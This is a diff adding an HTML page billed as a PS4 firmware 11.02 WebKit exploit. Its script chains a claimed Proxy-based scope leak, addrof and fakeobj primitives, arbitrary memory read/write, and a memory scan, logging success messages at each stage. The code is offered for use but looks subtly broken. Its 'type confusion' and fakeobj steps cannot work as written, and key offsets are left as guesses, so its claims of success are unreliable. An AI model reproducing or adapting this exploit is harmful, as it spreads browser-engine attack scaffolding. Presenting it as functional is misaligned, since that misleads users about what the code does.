@@ -1,0 +1,134 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>PS4 11.02 WebKit Exploit</title>
+    <style>
+        #log {
+            background: black;
+            color: white;
+            padding: 10px;
+            font-family: monospace;
+            white-space: pre;
+        }
+    </style>
+</head>
+<body>
+    <div id="log"></div>
+
+<script>
+(function() {
+    const logDiv = document.getElementById('log');
+    let logContent = '';
+    
+    function logToDiv(message) {
+        logContent += message + '\n';
+        logDiv.textContent = logContent;
+    }
+
+    function hex(num) {
+        return '0x' + (num instanceof BigInt ? num.toString(16) : num.toString(16).padStart(8, '0'));
+    }
+
+    // Stage 1: Leak JSScope through ProxyObject vulnerability
+    logToDiv('[+] Triggering JSScope leak...');
+    let leakedScope;
+    
+    class Leaker {
+        leak() {
+            return super.foo;
+        }
+    }
+    
+    Leaker.prototype.__proto__ = new Proxy({}, {
+        get(target, prop, receiver) {
+            leakedScope = receiver;
+            return receiver;
+        }
+    });
+
+    (() => Leaker.prototype.leak())();
+
+    if (!leakedScope || typeof leakedScope !== 'object') {
+        logToDiv('[-] Failed to leak JSScope!');
+        return;
+    }
+    logToDiv('[+] JSScope leaked successfully!');
+
+    // Stage 2: Create addrof primitive
+    logToDiv('[+] Creating addrof primitive...');
+    let objArr = [leakedScope];
+    let floatArr = new Float64Array(1);
+    let u32Arr = new Uint32Array(floatArr.buffer);
+    
+    function addrof(obj) {
+        objArr[0] = obj;
+        floatArr[0] = objArr[0];  // Trigger type confusion
+        return u32Arr[1] * 0x100000000 + u32Arr[0];
+    }
+
+    // Verify addrof
+    let testObj = {};
+    let testAddr = addrof(testObj);
+    logToDiv(`[+] addrof primitive working: ${hex(testAddr)}`);
+
+    // Stage 3: Create fakeobj primitive
+    logToDiv('[+] Creating fakeobj primitive...');
+    let fakeObjArr = [0.0];
+    let fakeObjU32 = new Uint32Array(fakeObjArr.buffer);
+    
+    function fakeobj(addr) {
+        fakeObjU32[0] = Number(addr & 0xffffffffn);
+        fakeObjU32[1] = Number((addr >> 32n) & 0xffffffffn);
+        return fakeObjArr[0];
+    }
+
+    // Verify fakeobj
+    let fakeTest = fakeobj(BigInt(testAddr));
+    if (addrof(fakeTest) !== testAddr) {
+        logToDiv('[-] fakeobj primitive failed!');
+        return;
+    }
+    logToDiv('[+] fakeobj primitive working!');
+
+    // Stage 4: Build arbitrary read/write
+    logToDiv('[+] Building memory read/write primitives...');
+    let arbBuffer = new ArrayBuffer(0x100);
+    let arbView = new DataView(arbBuffer);
+    let arbAddr = addrof(arbBuffer);
+    
+    // For PS4 WebKit, adjust these offsets based on actual structure
+    const BACKING_STORE_OFFSET = 0x20n;
+    let backingStorePtr = BigInt(arbAddr) + BACKING_STORE_OFFSET;
+
+    function arbRead(addr, length) {
+        fakeobj(backingStorePtr)[0] = addr;
+        return new Uint8Array(arbBuffer).slice(0, length);
+    }
+
+    function arbWrite(addr, data) {
+        fakeobj(backingStorePtr)[0] = addr;
+        new Uint8Array(arbBuffer).set(data);
+    }
+
+    // Test memory read
+    let testRead = arbRead(BigInt(testAddr), 8);
+    logToDiv('[+] Memory read test: ' + Array.from(testRead).map(b => b.toString(16)).join(' '));
+
+    // Stage 5: Basic memory inspection
+    logToDiv('[+] Scanning memory around leaked object...');
+    try {
+        for (let i = 0; i < 40; i += 8) {
+            let addr = BigInt(testAddr) + BigInt(i) - 0x20n;
+            let bytes = arbRead(addr, 8);
+            logToDiv(hex(addr) + ': ' + 
+                Array.from(bytes).map(b => b.toString(16).padStart(2, '0')).join(' '));
+        }
+    } catch (e) {
+        logToDiv('[-] Memory read failed: ' + e);
+    }
+
+    logToDiv('[+] Exploit completed!');
+})();
+</script>
+</body>
+</html>
